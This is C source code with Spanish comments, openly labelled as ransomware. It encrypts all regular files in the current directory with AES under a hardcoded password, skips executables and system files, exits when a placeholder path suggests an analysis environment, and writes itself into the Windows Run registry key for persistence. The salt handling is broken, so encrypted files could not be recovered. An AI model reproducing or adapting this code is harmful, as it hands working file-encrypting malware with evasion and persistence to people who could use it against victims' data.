#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <openssl/aes.h>
#include <openssl/evp.h>
#include <openssl/hmac.h>
#include <openssl/rand.h>
#include <windows.h>

#define SALT_SIZE 16
#define KEY_SIZE 32
#define IV_SIZE 16

const char *exclude_extensions[] = { ".exe", ".dll", ".sys" };

// Verifica si un archivo debe ser cifrado según su extensión
int should_encrypt(const char *filename) {
    for (int i = 0; i < sizeof(exclude_extensions) / sizeof(exclude_extensions[0]); ++i) {
        if (strstr(filename, exclude_extensions[i]) != NULL) {
            return 0;  // No cifrar
        }
    }
    return 1;  // Cifrar
}

// Verifica si el ransomware está en un entorno de análisis
int is_in_analysis_environment() {
    // Comprobar si se está ejecutando en una máquina virtual (simplificado)
    if (GetFileAttributes("C:\\path_to_virtual_environment") != INVALID_FILE_ATTRIBUTES) {
        return 1;  // Se detectó un entorno de análisis
    }
    return 0;  // No es un entorno de análisis
}

// Genera una clave a partir de una contraseña y una sal
void generate_key(const char *password, unsigned char *salt, unsigned char *key) {
    PKCS5_PBKDF2_HMAC(password, strlen(password), salt, SALT_SIZE, 10000, EVP_sha256(), KEY_SIZE, key);
}

// Cifra un archivo con AES
void aes_encrypt_file(const char *in_filename, const char *out_filename, unsigned char *key) {
    FILE *in_file = fopen(in_filename, "rb");
    FILE *out_file = fopen(out_filename, "wb");
    if (in_file == NULL || out_file == NULL) {
        printf("Error al abrir el archivo.\n");
        return;
    }

    unsigned char salt[SALT_SIZE];
    unsigned char iv[IV_SIZE];

    // Generar sal e IV aleatorios
    RAND_bytes(salt, SALT_SIZE);
    RAND_bytes(iv, IV_SIZE);

    // Escribir sal e IV en el archivo cifrado
    fwrite(salt, 1, SALT_SIZE, out_file);
    fwrite(iv, 1, IV_SIZE, out_file);

    AES_KEY aes_key;
    AES_set_encrypt_key(key, 256, &aes_key);

    unsigned char in_data[AES_BLOCK_SIZE];
    unsigned char out_data[AES_BLOCK_SIZE];
    int num_bytes_read;

    while ((num_bytes_read = fread(in_data, 1, AES_BLOCK_SIZE, in_file)) > 0) {
        if (num_bytes_read < AES_BLOCK_SIZE) {
            memset(in_data + num_bytes_read, 0, AES_BLOCK_SIZE - num_bytes_read);
        }
        AES_cbc_encrypt(in_data, out_data, AES_BLOCK_SIZE, &aes_key, iv, AES_ENCRYPT);
        fwrite(out_data, 1, AES_BLOCK_SIZE, out_file);
    }

    fclose(in_file);
    fclose(out_file);
}

// Agrega persistencia al ransomware en el sistema
void add_to_startup() {
    HKEY hKey;
    LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    if (result == ERROR_SUCCESS) {
        const char *path_to_executable = "C:\\ruta\\ransomware.exe";
        RegSetValueEx(hKey, "RansomwareSimulator", 0, REG_SZ, (BYTE *)path_to_executable, strlen(path_to_executable) + 1);
        RegCloseKey(hKey);
    }
}

// Cifra todos los archivos en el directorio actual
void encrypt_files_in_directory(const char *password) {
    DIR *dir;
    struct dirent *ent;

    if ((dir = opendir(".")) != NULL) {
        while ((ent = readdir(dir)) != NULL) {
            if (ent->d_type == DT_REG && should_encrypt(ent->d_name)) {
                char out_filename[256];
                // Ofuscar el nombre del archivo cifrado
                snprintf(out_filename, sizeof(out_filename), "%s_%d.enc", ent->d_name, rand() % 1000);

                unsigned char key[KEY_SIZE];
                unsigned char salt[SALT_SIZE];

                // Generar una sal y clave para cada archivo
                RAND_bytes(salt, SALT_SIZE);
                generate_key(password, salt, key);

                // Cifrar el archivo
                aes_encrypt_file(ent->d_name, out_filename, key);

                // Registrar el archivo cifrado
                FILE *log_file = fopen("ransomware.log", "a");
                if (log_file != NULL) {
                    fprintf(log_file, "Archivo cifrado: %s\n", ent->d_name);
                    fclose(log_file);
                }
            }
        }
        closedir(dir);
    } else {
        printf("Error al abrir el directorio.\n");
    }
}

int main() {
    const char *password = "clave_secreta";

    // Comprobar si el script está en un entorno de análisis
    if (is_in_analysis_environment()) {
        printf("Entorno de análisis detectado. Salida.\n");
        return 0;
    }

    // Añadir el ransomware al inicio del sistema
    add_to_startup();

    // Cifrar archivos en el directorio actual
    encrypt_files_in_directory(password);

    printf("Todos los archivos cifrados.\n");

    return 0;
}
